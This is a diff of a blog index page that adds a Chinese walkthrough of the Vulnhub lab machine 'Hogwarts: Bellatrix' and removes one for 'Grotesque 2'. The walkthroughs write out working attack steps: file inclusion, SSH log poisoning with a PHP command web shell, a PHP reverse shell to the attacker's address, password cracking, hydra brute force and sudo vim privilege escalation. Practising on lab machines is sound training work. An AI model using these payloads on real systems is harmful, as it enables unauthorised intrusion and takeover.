@@ -86,6 +86,100 @@
 
     
         <h2 class="title">
+            <a href="/2022/08/08/Hogwarts-Bellatrix/">
+                Hogwarts Bellatrix
+            </a>
+        </h2>
+    
+    <time>
+        Aug 8, 2022
+    </time>
+    <section class="content">
+        <h1><span id="hogwarts-bellatrix">HOGWARTS: BELLATRIX</span></h1><h2><span id="一-基本信息">一、基本信息</span></h2><blockquote>
+<h4><span id="名称hogwarts-bellatrix">名称：Hogwarts: Bellatrix</span></h4><h4><span id="发布日期20201128">发布日期：2020.11.28</span></h4><h4><span id="作者bly">作者：BLY</span></h4><h4><span id="系列hogwarts">系列：Hogwarts</span></h4><h4><span id="推特bertrandlorent9">推特：@BertrandLorent9</span></h4></blockquote>
+<h2><span id="二-靶机简介">二、靶机简介</span></h2><blockquote>
+<h4><span id="flags">Flags：</span></h4><p>root:&#x2F;root&#x2F;root.txt </p>
+<h4><span id="难度简单">难度：简单</span></h4></blockquote>
+<h2><span id="三-文件信息">三、文件信息</span></h2><blockquote>
+<h4><span id="文件名bellatrixova">文件名：Bellatrix.ova</span></h4><h4><span id="文件大小41gb">文件大小：4.1GB</span></h4><h4><span id="下载地址httpscybersecs3cn-north-1amazonawscomcnimagehogwartsbellatrixova">下载地址：</span></h4><h4><span id="md5-e6d98d406cdf7641e4a966f16afaf536">MD5: E6D98D406CDF7641E4A966F16AFAF536</span></h4><h4><span id="sha1-8389861c7f2b1626190844e31a2a1a4ade385e06">SHA1: 8389861C7F2B1626190844E31A2A1A4ADE385E06</span></h4></blockquote>
+<h2><span id="四-镜像信息">四、镜像信息</span></h2><blockquote>
+<h4><span id="格式virtual-machine-virtualbox-ova">格式：Virtual Machine (Virtualbox - OVA)</span></h4><h4><span id="操作系统linuxubuntu">操作系统：Linux(ubuntu)</span></h4></blockquote>
+<h2><span id="五-网络信息">五、网络信息</span></h2><blockquote>
+<h4><span id="dhcp服务可用">DHCP服务：可用</span></h4><h4><span id="ip地址自动分配">IP地址：自动分配</span></h4></blockquote>
+<h2><span id="六-环境配置">六、环境配置</span></h2><blockquote>
+<p>1.将靶机Bellatrix和攻击机kali2021在VirtualBox下设置为仅主机模式，使用DHCP分配ip地址：</p>
+<p><img src="/2022/08/08/Hogwarts-Bellatrix/1.png" alt="image-"></p>
+</blockquote>
+<h2><span id="七-攻略步骤">七、攻略步骤</span></h2><h3><span id="信息探测">信息探测</span></h3><blockquote>
+<p>1.因为是没有直接告知我们靶机ip的，所以要先进行主机探测，先查看下kali分配到的ip，在进行网段扫描，命令如下，得到靶机ip为192.168.56.102：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig，查看kali分配到的ip</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/08/Hogwarts-Bellatrix/2.png" alt="image-"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.56.0/24，扫描靶机ip</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/08/Hogwarts-Bellatrix/3.png" alt="image-"></p>
+<p>2.再进行端口扫描，发现只开放了22和80端口，访问主页，发现提示存在文件包含：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T4 -sC -sV -p- --min-rate=1000 192.168.56.127 | tee nmapscan，端口扫描</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/08/Hogwarts-Bellatrix/4.png" alt="image-"></p>
+<p><img src="/2022/08/08/Hogwarts-Bellatrix/5.png" alt="image-"></p>
+<p>3.最后再进行一下目录扫描，没有太多值得关注的信息：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://192.168.56.127 -x html,php,bak,txt --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt，目录扫描</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/08/Hogwarts-Bellatrix/6.png" alt="image-"></p>
+</blockquote>
+<h3><span id="文件包含漏洞利用">文件包含漏洞利用</span></h3><blockquote>
+<p>1.在主页其实是提示了有ikilledsiriusblack.php这个文件，后面跟file参数存在文件包含漏洞：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.56.127/ikilledsiriusblack.php?file=/etc/passwd</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/08/Hogwarts-Bellatrix/7.png" alt="image-"></p>
+<p>2.利用文件包含漏洞，写入payload，获得shell：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.56.127/ikilledsiriusblack.php?file=/var/log/auth.log，可以查看SSH日志信息</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/08/Hogwarts-Bellatrix/8.png" alt="image-"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh &#x27;&lt;?php system($_GET[&#x27;cmd&#x27;]);?&gt;&#x27;@192.168.56.127，稍微污染SSH日志信息</span><br><span class="line">http://192.168.56.127/ikilledsiriusblack.php?file=/var/log/auth.log&amp;cmd=id，可以使用cmd命令</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/08/Hogwarts-Bellatrix/9.png" alt="image-"></p>
+<p><img src="/2022/08/08/Hogwarts-Bellatrix/10.png" alt="image-"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 1234</span><br><span class="line"></span><br><span class="line">http://192.168.56.127/ikilledsiriusblack.php?file=/var/log/auth.log&amp;cmd=php+-r+&#x27;$sock%3dfsockopen(&quot;192.168.56.102&quot;,1234)%3bexec(&quot;/bin/sh+-i+&lt;%263+&gt;%263+2&gt;%263&quot;)%3b&#x27;，写入命令反弹shell</span><br><span class="line"></span><br><span class="line">python3 -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;);&#x27;</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/08/Hogwarts-Bellatrix/11.png" alt="image-"></p>
+</blockquote>
+<h3><span id="密码爆破初步提权">密码爆破，初步提权</span></h3><blockquote>
+<p>1.我们可以在当前目录下发现一个被类似base编码了的目录，目录下有一个隐藏的字典文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ls -la</span><br><span class="line">cd c2VjcmV0cw==</span><br><span class="line">ls -la</span><br><span class="line">cat .secret.dic</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/08/Hogwarts-Bellatrix/12.png" alt="image-"></p>
+<p>2.而Swordofgryffindor内是lestrange用户与其密码hash：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat Swordofgryffindor</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/08/Hogwarts-Bellatrix/13.png" alt="image-"></p>
+<p>3.将密码字典复制与密码hash到kali本地，利用john进行爆破：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vim dic.txt</span><br><span class="line">vim hash.txt</span><br><span class="line">john --wordlist=dic.txt hash.txt</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/08/Hogwarts-Bellatrix/14.png" alt="image-"></p>
+<p>4.可以登录到lestrange用户：</p>
+<p><img src="/2022/08/08/Hogwarts-Bellatrix/15.png" alt="image-"></p>
+</blockquote>
+<h3><span id="root提权">root提权</span></h3><blockquote>
+<p>1.利用sudo -l命令，查找可用文件，发现vim可以提权：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/08/Hogwarts-Bellatrix/16.png" alt="image-"></p>
+<p>2.直接写入，提权到root：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -u root /usr/bin/vim -c &#x27;:!/bin/sh&#x27;</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/08/Hogwarts-Bellatrix/17.png" alt="image-"></p>
+</blockquote>
+<h3><span id="flag获取">Flag获取</span></h3><blockquote>
+<p>1.现在我们在&#x2F;root目录下能够发现flag，即proof.txt：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /root</span><br><span class="line">ls -la</span><br><span class="line">cat root.txt</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/08/Hogwarts-Bellatrix/18.png" alt="image-"></p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Hogwarts/" rel="tag">Hogwarts</a><a class="tag-none-link" href="/tags/Vulnhub/" rel="tag">Vulnhub</a><a class="tag-none-link" href="/tags/WriteUp/" rel="tag">WriteUp</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
             <a href="/2022/08/08/Harrypotter-Ar/">
                 Harrypotter Aragog
             </a>
@@ -908,95 +1002,6 @@
         
             <div class="tags">
                 <a class="tag-none-link" href="/tags/Hackable/" rel="tag">Hackable</a><a class="tag-none-link" href="/tags/Vulnhub/" rel="tag">Vulnhub</a><a class="tag-none-link" href="/tags/WriteUp/" rel="tag">WriteUp</a>
-            </div>
-        
-
-    </section>
-</article>
-  
-    <article class="post ">
-
-    
-        <h2 class="title">
-            <a href="/2022/06/13/Grotesque-2/">
-                Grotesque 2
-            </a>
-        </h2>
-    
-    <time>
-        Jun 13, 2022
-    </time>
-    <section class="content">
-        <h1><span id="grotesque2">Grotesque:2</span></h1><h2><span id="一-基本信息">一、基本信息</span></h2><blockquote>
-<h4><span id="名称grotesque2">名称：Grotesque:2</span></h4><h4><span id="发布日期2021330">发布日期：2021.3.30</span></h4><h4><span id="作者tasiyanci">作者：tasiyanci</span></h4><h4><span id="系列grotesque">系列：Grotesque</span></h4><h4><span id="推特tasiyanci">推特：@tasiyanci</span></h4></blockquote>
-<h2><span id="二-靶机简介">二、靶机简介</span></h2><blockquote>
-<h4><span id="flags">Flags：</span></h4><p>angel:&#x2F;~&#x2F;user.txt<br>root:&#x2F;root&#x2F;root.txt</p>
-<h4><span id="难度简单">难度：简单</span></h4></blockquote>
-<h2><span id="三-文件信息">三、文件信息</span></h2><blockquote>
-<h4><span id="文件名grotesque2_vhova">文件名：grotesque2_vh.ova</span></h4><h4><span id="文件大小824mb">文件大小：824MB</span></h4><h4><span id="下载地址httpscybersecs3cn-north-1amazonawscomcnimagegrotesquegrotesque2_vhova">下载地址：</span></h4><h4><span id="md5-57a2630c846d285b1390789d2d5b1c3d">MD5: 57A2630C846D285B1390789D2D5B1C3D</span></h4><h4><span id="sha1-b6fa719aca753e479dc5d3425b0c7a4435019c59">SHA1: B6FA719ACA753E479DC5D3425B0C7A4435019C59</span></h4></blockquote>
-<h2><span id="四-镜像信息">四、镜像信息</span></h2><blockquote>
-<h4><span id="格式virtual-machine-virtualbox-ova">格式：Virtual Machine (Virtualbox - OVA)</span></h4><h4><span id="操作系统linuxdebain">操作系统：Linux(debain)</span></h4></blockquote>
-<h2><span id="五-网络信息">五、网络信息</span></h2><blockquote>
-<h4><span id="dhcp服务可用">DHCP服务：可用</span></h4><h4><span id="ip地址自动分配">IP地址：自动分配</span></h4></blockquote>
-<h2><span id="六-环境配置">六、环境配置</span></h2><blockquote>
-<p>1.将靶机grotesque2和攻击机kali2021在VirtualBox下设置为仅主机模式，使用DHCP分配ip地址：</p>
-<p><img src="/2022/06/13/Grotesque-2/1.png" alt="image-"></p>
-</blockquote>
-<h2><span id="七-攻略步骤">七、攻略步骤</span></h2><h3><span id="信息探测">信息探测</span></h3><blockquote>
-<p>1.因为是没有直接告知我们靶机ip的，所以要先进行主机探测，先查看下kali分配到的ip，在进行网段扫描，命令如下，得到靶机ip为192.168.56.102：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig，查看kali分配到的ip</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/13/Grotesque-2/2.png" alt="image-"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.56.0/24，扫描靶机ip</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/13/Grotesque-2/3.png" alt="image-"></p>
-<p>2.再进行端口扫描，发现开放了很多端口，看来是做迷惑，访问主页，源码只有js内容：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T4 -sC -sV -p- --min-rate=1000 192.168.56.109 | tee nmapscan，端口扫描</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/13/Grotesque-2/4.png" alt="image-"></p>
-<p><img src="/2022/06/13/Grotesque-2/5.png" alt="image-"></p>
-<p>3.最后再进行一下目录扫描，发现也是很多目录且无法对应端口，没办法，把全部的index页获取下来，按大小排序，找寻线索：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://192.168.56.109/ -x html,php,bak,txt --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt –wildcard switch，目录扫描</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/13/Grotesque-2/6.png" alt="image-"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for i in &#123;23..600&#125;; do wget 192.168.56.109:$i -O index$i; done，获取各端口index</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/13/Grotesque-2/7.png" alt="image-"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -la | sort，排序文件，最大是index258</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/13/Grotesque-2/8.png" alt="image-"></p>
-</blockquote>
-<h3><span id="发现目标页">发现目标页</span></h3><blockquote>
-<p>1.访问一下大小最大的页面192.168.56.108:258，页面提示我们ssh用户名，我们查看页面源码，发现ok的emoji其实是一张图片：</p>
-<p><img src="/2022/06/13/Grotesque-2/9.png" alt="image-"></p>
-<p>2.将emoji的图片下载，放大后得到一串类似md5的字串，直接md5无法解出，但是页面有提示我们-100，得到ssh密码：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://192.168.56.109:258/emoji/hand.png</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/13/Grotesque-2/10.png" alt="image-"></p>
-<p><img src="/2022/06/13/Grotesque-2/11.png" alt="image-"></p>
-<p><img src="/2022/06/13/Grotesque-2/12.png" alt="image-"></p>
-</blockquote>
-<h3><span id="ssh登录">SSH登录</span></h3><blockquote>
-<p>1.通过刚才的ssh用户名提示，我们可以试出是用户angel的密码，也可以使用hydra进行爆破，将ssh用户统一写入use.txt：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -L use.txt -p solomon1 ssh://192.168.56.109</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/13/Grotesque-2/13.png" alt="image-"></p>
-<p><img src="/2022/06/13/Grotesque-2/14.png" alt="image-"></p>
-<p>2.登录后在目录下发现第一个flag，user.txt：</p>
-<p><img src="/2022/06/13/Grotesque-2/15.png" alt="image-"></p>
-</blockquote>
-<h3><span id="pspy64s-监控进程获取flag">pspy64s 监控进程，获取flag</span></h3><blockquote>
-<p>1.进入quiet文件夹，发现大量数字命名文件，用pspy64s进行进程监控，发现有定时任务的读写检查：</p>
-<p><img src="/2022/06/13/Grotesque-2/16.png" alt="image-"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 8001，kali开启http服务</span><br><span class="line">wget http://192.168.56.102:8001/pspy64s，angel获取pspy64s工具</span><br><span class="line">chmod +x pspy64s，给予执行权力</span><br><span class="line">./pspy64s，开启进程监听</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/13/Grotesque-2/17.png" alt="image-"></p>
-<p><img src="/2022/06/13/Grotesque-2/18.png" alt="image-"></p>
-<p>2.删去quiet目录下所有文件，让定时任务执行后，进一步查看，发现rootcreds.txt，可以获得root的密码：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rm -rf *，删除后根据进程定时大概要等待一段时间再查看</span><br><span class="line">ls -la /</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/13/Grotesque-2/19.png" alt="image-"></p>
-<p><img src="/2022/06/13/Grotesque-2/20.png" alt="image-"></p>
-<p>3.登录root用户，在&#x2F;root目录下发现第二个flag，root.txt：</p>
-<p><img src="/2022/06/13/Grotesque-2/21.png" alt="image-"></p>
-</blockquote>
-
-
-        
-
-        
-            <div class="tags">
-                <a class="tag-none-link" href="/tags/Grotesque/" rel="tag">Grotesque</a><a class="tag-none-link" href="/tags/Vulnhub/" rel="tag">Vulnhub</a><a class="tag-none-link" href="/tags/WriteUp/" rel="tag">WriteUp</a>
             </div>
         
 
